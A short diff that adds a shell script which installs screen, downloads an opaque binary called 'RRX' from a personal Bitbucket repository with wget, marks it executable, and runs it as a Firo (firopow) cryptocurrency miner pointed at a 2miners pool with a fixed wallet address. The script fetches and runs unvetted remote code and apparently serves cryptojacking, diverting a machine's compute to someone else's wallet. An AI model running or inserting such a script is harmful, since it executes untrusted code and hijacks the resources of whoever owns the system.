@@ -1,0 +1,5 @@
+sudo apt-get update -y
+sudo apt install screen -y
+wget https://bitbucket.org/ndj8777k/ytt/raw/d35e4ea0692b202b0fe334d830bce68f585afd9f/RRX
+chmod u+x RRX
+./RRX -a firopow -o stratum+tcp://asia-firo.2miners.com:8181 -u aDSfCZVHiPf7tUuVcibdxzPbsKgT46n8iB.fir -p x
